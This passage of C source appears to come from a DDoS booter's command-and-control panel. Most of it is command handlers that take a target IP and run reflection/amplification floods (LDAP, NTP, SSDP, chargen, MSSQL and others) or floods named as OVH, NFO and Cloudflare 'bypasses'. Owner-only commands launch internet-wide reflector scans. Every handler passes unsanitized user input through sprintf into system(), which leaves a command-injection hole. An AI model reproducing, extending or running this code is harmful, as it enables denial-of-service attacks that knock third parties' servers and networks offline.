        strcpy(command, "./amp/scanners/portmapscan 1.1.1.1 255.255.255.255 amp/lists/portmap.txt 2 1ms" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStarting PORTMAP Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
              if (strstr(buf, ".sds on") || strstr(buf, ".SDS ON")) // System Command Function -- [TESTING HERE]
        {
      if(strcmp(admin, accounts[find_line].id) == 0) // Check If User Is Admin
        {
        char command[50];
        trim(command);
        strcpy(command, "./amp/scanners/ssdpscan 1.1.1.1 255.255.255.255 amp/lists/ssdp.txt 2 1ms" );
        system(command);
        sprintf(botnet, "\e[38;5;93mStarting SSDP Mass-Scan!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(botnet, "\e[38;5;93mOwners Only!!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
        }
         if (strstr(buf, ".pwrcheck") || strstr(buf, ".PWRCHECK")) // System Command Function
         {
        char filename[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(filename, sizeof(filename), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(filename); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "wc -l < %s.txt",filename); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "   \r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".ban") || strstr(buf, ".BAN")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "iptables -A INPUT -s %s -j DROP", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "\e[38;5;202mIP:\e[38;5;201m[\e[38;5;202m%s\e[38;5;201m] \e[38;5;202mBanned!\r\n", iptarget);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".ldap") || strstr(buf, ".LDAP")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/ldap %s 80 amp/lists/ldap.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: LDAP        \e[38;5;201m ╠══════╣ \e[38;5;202m. KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: LDAP-IPHM    \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        // LDAP TEST FUNCTION
        // if (strstr(buf, ".ldap") || strstr(buf, ".LDAP")) // System Command Function
        // {
        //char iptarget[5000]; // Char Every Line For Output Communication
        //char *token = strtok(buf, " "); // Create Delimiter
        //snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        //trim(iptarget); // Trim [iptarget]
        //char iptime[5000]; // Char Every Line For Output Communication
        //char *tokenn = strtok(buf, " "); // Create Delimiter
        //snprintf(iptime, sizeof(iptime), "%s", tokenn+strlen(tokenn)+1); // String Comparison From User Input - Using Token Size
        //trim(iptime); // Trim [iptime]
        //char *ipkill[5000]; // Creating A System Function
        //trim(ipkill); // Trim [ipkill]
        //sprintf(ipkill, "./ldap %s 80 ldap.txt 2 -1 %s", iptarget, iptime); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        //system(ipkill); // System Execution
        //sprintf(botnet, "Test Function Activated, IP : %s - Time : %s", iptarget, iptime);
        //if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        //}
        if (strstr(buf, ".ntp") || strstr(buf, ".NTP")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/ntp %s 80 amp/lists/ntp.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: NTP         \e[38;5;201m ╠══════╣ \e[38;5;202m. KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: NTP-IPHM     \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".ssdp") || strstr(buf, ".SSDP")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/ssdp %s 80 amp/lists/ssdp.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: SSDP        \e[38;5;201m ╠══════╣ \e[38;5;202m. KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: SSDP-IPHM    \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
      if (strstr(buf, ".tftp") || strstr(buf, ".TFTP")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/tftp %s 80 amp/lists/tftp.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: TFTP        \e[38;5;201m ╠══════╣ \e[38;5;202m. KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: TFTP-IPHM    \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".portmap") || strstr(buf, ".PORTMAP")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/portmap %s 80 amp/lists/portmap.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: PORTMAP     \e[38;5;201m ╠══════╣ \e[38;5;202m. KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: PRTMP-IPHM   \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".sentinel") || strstr(buf, ".SENTINEL")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/sentinel %s 80 amp/lists/sentinel.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m:\e[38;5;202m SENTINEL     \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m: \e[38;5;202mSENTINEL-IPHM \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".netbios") || strstr(buf, ".NETBIOS")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/netbios %s 80 amp/lists/netbios.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m: \e[38;5;202mNETBIOS      \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m: \e[38;5;202mNETBIOS-IPHM  \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".chargen") || strstr(buf, ".CHARGEN")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/chargen %s 80 amp/lists/chargen.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m: \e[38;5;202mCHARGEN      \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack!\e[38;5;201m ║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m: \e[38;5;202mCHARGEN-IPHM  \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".mssql") || strstr(buf, ".MSSQL")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/mssql %s 80 amp/lists/mssql.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m:\e[38;5;202m MSSQL        \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m: \e[38;5;202mMSSQL-IPHM    \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".ts3") || strstr(buf, ".TS3")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Reflection/ts3 %s 80 amp/lists/ts3.txt 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m:\e[38;5;202m TS3          \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m:\e[38;5;202m TS3-IPHM      \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".prowin") || strstr(buf, ".PROWIN")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/prowin %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m: \e[38;5;202mPROWIN       \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m:\e[38;5;202m PROWIN-IPHM   \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".winsyn") || strstr(buf, ".WINSYN")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/winsyn %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m:\e[38;5;202m WINSYN       \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m: \e[38;5;202mWINSYN-IPHM   \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".yubina") || strstr(buf, ".YUBINA")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/yubina %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         ║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m: \e[38;5;202mYUBINA       ╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m: \e[38;5;202mYUBINA-IPHM   ║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".winseqid") || strstr(buf, ".WINSEQID")) // System Command Function
        {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/winseqid %s", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;201mMethod\e[38;5;201m: \e[38;5;202mWINSEQID     \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;201mUsage\e[38;5;201m: \e[38;5;202mWINSEQID-IPHM \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".ovhbypass") || strstr(buf, ".OVHBYPASS")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/ovhbypass %s 80 300 UDP", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m:\e[38;5;202m OVHBYPASS    \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m:\e[38;5;202m OVHBYPASS-IPHM\e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".nfobypass") || strstr(buf, ".NFOBYPASS")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/nfobypass %s 80", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m:\e[38;5;202m NFOBYPASS    \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m:\e[38;5;202m NFOBYPASS-IPHM\e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".cfbypass") || strstr(buf, ".CFBYPASS")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "php amp/methods/Bandwidth/CF_Bypass %s proxy.txt 2 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m: \e[38;5;202mCFBYPASS     \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m: \e[38;5;202mCFBYPASS-IPHM \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".bo4bypass") || strstr(buf, ".BO4BYPASS")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/bo4bypass %s 62627 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m:\e[38;5;202m BO4BYPASS    \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m: \e[38;5;202mBO4BYPASS-IPHM\e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".vse") || strstr(buf, ".VSE")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/vse %s 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔═══════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod\e[38;5;201m: \e[38;5;202mVSE          \e[38;5;201m╠══════╣ \e[38;5;202m.KILL to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage\e[38;5;201m: \e[38;5;202mVSE-IPHM      \e[38;5;201m║      ╚═══════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        }
        if (strstr(buf, ".dominate") || strstr(buf, ".DOMINATE")) // System Command Function
         {
        char iptarget[5000]; // Char Every Line For Output Communication
        char *token = strtok(buf, " "); // Create Delimiter
        snprintf(iptarget, sizeof(iptarget), "%s", token+strlen(token)+1); // String Comparison From User Input - Using Token Size
        trim(iptarget); // Trim [iptarget]
        char *ipkill[5000]; // Creating A System Function
        trim(ipkill); // Trim [ipkill]
        sprintf(ipkill, "./amp/methods/Bandwidth/dominate %s 80 2 -1 300", iptarget); // Default Time Has Been Set To 30 Seconds. Default Port Is 80
        system(ipkill); // System Execution
